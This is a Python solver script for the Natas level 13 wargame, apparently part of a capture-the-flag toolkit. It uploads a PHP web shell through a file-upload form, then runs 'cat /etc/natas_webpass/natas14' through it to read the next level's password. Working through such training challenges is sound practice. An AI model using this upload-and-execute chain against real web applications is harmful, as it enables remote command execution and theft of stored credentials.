import re
import requests
from .base_solver import NatasSolver

class Natas13Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Create new session
            self.http_client.session = requests.Session()
            
            # Use existing pwd_script.php
            script_path = 'payloads/pwd_script.php'
            
            # Upload payload with PHP extension
            with open(script_path, 'rb') as f:
                response = self.make_request(
                    method="POST",
                    files={"uploadedfile": f},
                    data={
                        "filename": "pwd_script.php",
                        "MAX_FILE_SIZE": "1000"
                    }
                )
            
            # Extract uploaded file path with correct regex
            match = re.findall(r'"upload/(.*).php"', response.text)
            if not match:
                print(f"[!] Upload response: {response.text}")
                raise ValueError("Could not find uploaded file path")
                
            uploaded_file = match[0]
            print(f"[+] File uploaded as: {uploaded_file}.php")
            
            # Execute payload by accessing the uploaded file with pwd parameter
            response = self.make_request(
                f"upload/{uploaded_file}.php",
                params={"pwd": "cat /etc/natas_webpass/natas14"}
            )
            
            # Extract only the password, removing GIF header
            lines = response.text.strip().split('\n')
            # Get the last non-empty line as password
            password = next(line for line in reversed(lines) if line.strip())
            
            if not password or len(password) != 32:
                print(f"[!] Execution response: {response.text}")
                raise ValueError("Invalid password format in response")
                
            return password
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas13: {str(e)}")

